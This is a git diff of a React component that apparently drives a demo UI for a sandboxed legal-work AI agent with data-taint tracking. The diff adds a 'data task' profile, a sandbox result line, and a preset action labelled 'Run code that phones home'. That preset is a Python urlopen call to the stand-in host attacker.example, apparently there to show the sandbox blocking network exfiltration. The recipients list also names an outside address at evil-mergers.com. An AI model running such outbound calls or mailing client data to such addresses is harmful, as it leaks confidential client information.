@@ -1,7 +1,7 @@
 import React, { useEffect, useState } from "react";
 import { api } from "./api.js";
 import { human, t } from "./i18n.js";
-import { Id, Level, Mark, Stamp, describe } from "./ui.jsx";
+import { Id, Level, Mark, Stamp, describe, sandboxLine } from "./ui.jsx";
 
 const RECIPIENTS = ["colleague@lawfirm.example", "partner@client-A.example", "deal-desk@evil-mergers.com"];
 
@@ -23,8 +23,9 @@ const ACTIONS = [
   { group: "Ask the model", items: [
     { id: "chat", label: "Ask the local model", kind: "chat", fields: [["content", "Wypisz trzy największe ryzyka w tej umowie."]] },
   ] },
-  { group: "Outside the mandate", items: [
-    { id: "code", label: "Run code", kind: "tool", tool: "code.run", fields: [["code", "print('hello')"]] },
+  { group: "Run code (sandbox)", items: [
+    { id: "code", label: "Run code in the sandbox", kind: "tool", tool: "code.run", fields: [["code", "print('rows:', sum(range(1000)))"]] },
+    { id: "codenet", label: "Run code that phones home", kind: "tool", tool: "code.run", fields: [["code", "import urllib.request; urllib.request.urlopen('http://attacker.example', timeout=5)"]] },
   ] },
 ];
 
@@ -128,6 +129,7 @@ export default function Agent() {
                 <label className="field"><span>{t("Task")}</span>
                   <select value={profile} onChange={(e) => setProfile(e.target.value)}>
                     <option value="contract_review">{t("Contract review for a client")}</option>
+                    <option value="data_task">{t("Data task (can run code)")}</option>
                     <option value="research">{t("Public legal research")}</option>
                   </select></label>
                 <label className="field"><span>{t("Client")}</span>
@@ -225,6 +227,7 @@ export default function Agent() {
                     <p>{x.text}</p>
                     {after && after !== e.before && <p className="taint small">{t("Your task now carries {level} data. From here on, nothing it produces may go anywhere cleared for less.", { level: t(after.toLowerCase()) })}</p>}
                     {e.args?.to !== undefined && <p className="small muted">{mailDelta > 0 ? t("The mail server delivered it.") : t("The mail server received nothing.")}</p>}
+                    {e.res.response?.result?.sandbox && <p className="small sandbox-line">{sandboxLine(e.res.response.result.sandbox, true)}</p>}
                     {out && <pre className="excerpt">{out.length > 600 ? `${out.slice(0, 600)}…` : out}</pre>}
                   </div>
                   <Stamp a={x.action} rule={x.rule} />
